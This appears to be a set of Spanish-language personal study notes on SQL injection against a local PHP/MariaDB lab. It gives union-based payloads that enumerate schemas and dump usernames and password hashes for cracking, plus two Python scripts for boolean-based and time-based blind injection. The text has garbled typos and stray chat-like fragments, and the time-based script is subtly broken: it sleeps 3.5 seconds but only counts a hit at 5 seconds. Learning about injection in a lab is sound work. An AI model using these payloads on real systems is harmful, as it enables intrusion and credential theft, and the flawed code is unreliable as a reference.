
---------
#vulnerabilidad #sql #mariadb

---------
Primeramente para entender el coonceoptp de las sqli tenemos que instalarnbosa estas bibliotecas con el sigfuiente ocmando :

```bash
 sudo apt install mariadb-server apache2 php-mysql
```

Después de instalar los paquetes, iniciamos el servicio de la siguiente manera. Si se presenta algún error, es posible que el puerto 3306 esté ocupado por Docker. En ese caso, debes eliminar todas las imágenes y contenedores que estén utilizando dicho puerto. Una vez hecho esto, puedes inicializar el servicio de la siguiente forma:

```bash
service mysql start
service apache2 start 
```

Con el siguiente comando iniciamos la operación bajo SQL:

```bash
mysql -uroot -p
```

Algunos de los comandos comunes son:

- `SHOW DATABASES;`
- `USE mysql;`
- `SHOW TABLES;`
- `DESCRIBE user;`

Otros comandos útiles para mostrar los usuarios y sus contraseñas en la base de datos podrían ser:

- Para listar los usuarios en la base de datos MySQL:
    
    `SELECT User, Host FROM mysql.user;`
    
- Para mostrar los usuarios junto con sus hashes de contraseñas:
    
    `SELECT User, Host, authentication_string FROM mysql.user;`
    

Es importante recordar que en versiones más recientes de MySQL, las contraseñas se almacenan como hashes por razones de seguridad.

```sql
select user,password from user where user='root';
```

Para crear una base de datos, hacemos lo siguiente:

```sql 
create database NombreDeLaBasedeDatos;
```

Para crear una tabla en la base de datos haremos lo siguiente:

```sql
create table users(id int(32), username varchar(32), password varchar(32));
```

Para ingresar datos en la tabla lo podemos hacer con el siguiente comando:

```sql
insert into users(id,username,password) values(1,'admin','admin123$!pa$$');
```

Si quieres actualizar algún registro lo puedes hacer con:

```sql 
update users set id=2 where username='s4vitar';
```

Para crear un usuario podrías ejecutar la siguiente linea de comando:

```sql
create user 's4vitar'@'localhost' identified by 's4vitar123';
```

Y para darle todos los privilegios sobre la base de datos seria así:

```sql
grant all privileges on Hack4u.* to 's4vitar'@'localhost';
```

Para entender el funcionamiento de la inyección SQL en PHP, primero activamos los servicios de MySQL y Apache de la siguiente manera:

```bash
service mysql start 
service apache2 start
```

Exactamente. El método `GET` envía los datos a través de la URL, lo que permite pasar información directamente escribiéndola en la barra de direcciones del navegador. En el ejemplo anterior, usamos `GET` para recibir el valor del parámetro `usuario` directamente desde la URL, lo que puede ser peligroso si no se implementan medidas de seguridad, ya que cualquiera podría manipular la URL e inyectar código malicioso.

![[Pasted image 20240919195004.png]]

Como atacante, uno de los primeros pasos para realizar una inyección SQL es **enumerar el número de columnas** de la tabla solicitante. Esto se puede hacer utilizando el comando `ORDER BY` en la consulta SQL inyectada. El objetivo es descubrir cuántas columnas tiene la tabla sin causar errores.

![[Pasted image 20240919195912.png]]

```bash
searchitem=test' order by 5-- -
```

Luego, editando el comando a:

```bash
searchitem=test' union select 1,2,3,4,5-- -
```

Podemos ver que la inyección de código ahora nos muestra esos números. Posteriormente, para saber en qué base de datos estamos, lo hacemos con:

```bash
searchitem=test' union select 1,2,database(),4,5-- -
```

Posteriormente, si queremos saber el usuario al que le pertenece esa base de datos, lo hacemos con:

```bash
searchitem=test' union select 1,2,user(),4,5-- -
```

Ahora, si queremos ver todas las bases de datos disponibles, lo hacemos con:

```bash
searchitem=test' union select 1,2,schema_name,4,5 from information_schema.schemata-- -
```

Para ver las tablas que están disponibles en esa base de datos, hacemos lo siguiente:

```bash 
searchitem=test' union select 1,2,table_name,4,5 from information_schema.tables where table_schema='sqlitraining'-- -
```

Ahora, si queremos ver las columnas asociadas a esa tabla, lo que hacemos es lo siguiente:

```bash 
searchitem=test' union select 1,2,column_name,4,5 from information_schema.columns where table_schema='sqlitraining' and table_name='users'-- -
```

Posteriormente, si queremos ver los campos de usuario y contraseña, haremos lo siguiente:

```bash 
searchitem=test' union select 1,username,password,4,5 from users-- -
```

Si queremos concatenar para que sea más fácil copiar un solo hash en MD5, haremos lo siguiente:

```bash
searchitem=test' union select 1,2,group_concat(username,0x3a,password),4,5 from users-- -
```

En donde la parte de `0x3a` es la ejemplificación de los dos puntos (`:`) en hexadecimal, que es interpretado por la base de datos. Así, en el modo pretty de Burp Suite, podemos copiar la concatenación en un solo hash disponible.

Una vez copiadas las contraseñas en un archivo creado en `nvim`, en la terminal de comandos podemos aplicar una sustitución como:

```Nvim
%s/,\r/g
```

Donde la sustitución se aplica a la coma (`,`) por un retorno de carro (`\r`), y se le aplica a todo el archivo con la opción `/g`.

Ahora, con el siguiente comando, tomamos solo la parte de los hashes para después romperlos usando herramientas como hashes.com. Para extraer solo las contraseñas, ejecutamos el siguiente comando:

```bash 
cat contraseñas | awk '{print $2}' FS=":"
``````


![[Pasted image 20240919225236.png]]
![[Pasted image 20240919225320.png]]

---------------------

### CODIGO

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import log

# Manejador de señal para Ctrl+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Asignar el manejador de señal para Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

# Función para realizar la inyección SQL
def makeSQLi():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    extracted_info = ""

    # Enumerar posiciones y caracteres
    for position in range(1, 50):  # Suponemos un límite de 50 caracteres
        for character in range(33, 126):  # Rango de caracteres ASCII imprimibles
            sqli_url = main_url + "?id=1 or (select(select ascii(substr((database()), %d, 1)) from users where id=1)=%d)" % (position, character)

            p1.status(sqli_url)

            # Enviar la solicitud al servidor
            r = requests.get(sqli_url)

            # Verificar si el código de estado HTTP es 200 (éxito)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLi()

```


Exacto, otra técnica común en la inyección SQL ciega es la **inyección basada en tiempo**. En este tipo de ataque, no se espera un código de estado HTTP específico (como el `200`), sino que se evalúa el **tiempo de respuesta** del servidor. Si el servidor tarda en responder, esto indica que la consulta es verdadera, y si responde rápidamente, significa que es falsa.

En este caso, la inyección SQL utiliza funciones que hacen que el servidor espere un cierto periodo de tiempo (por ejemplo, con `SLEEP()` en MySQL) si una condición es verdadera. Si el servidor tarda en responder, entonces la letra probada es correcta.

![[Pasted image 20240919233245.png]]

-----------

### CODIGO

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import log

# Manejador de señal para Ctrl+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Asignar el manejador de señal para Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
tiempo_espera = 5  # Tiempo de espera en segundos
usuario_extraido = ""

# Función para realizar la inyección SQL basada en tiempo
def makeSQLi():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    # Enumerar posiciones y caracteres
    for position in range(1, 50):  # Suponemos un límite de 50 caracteres
        for character in range(33, 126):  # Rango de caracteres ASCII imprimibles
            # Construir la URL de la inyección SQL
            sqli_url = f"{main_url}?id=1 OR IF(ASCII(SUBSTR((database()), {position}, 1)) = {character}, SLEEP(3.5), 0)"

            p1.status(sqli_url)

            # Medir el tiempo de inicio
            tiempo_inicio = time.time()

            # Enviar la solicitud al servidor
            r = requests.get(sqli_url)

            # Medir el tiempo de fin
            tiempo_fin = time.time()

            # Calcular la diferencia de tiempo
            diferencia_tiempo = tiempo_fin - tiempo_inicio

            # Si la diferencia de tiempo es mayor o igual al tiempo de espera, el carácter es correcto
            if diferencia_tiempo >= tiempo_espera:
                usuario_extraido += chr(character)
                p2.status(usuario_extraido)
                break

if __name__ == '__main__':
    makeSQLi()

```

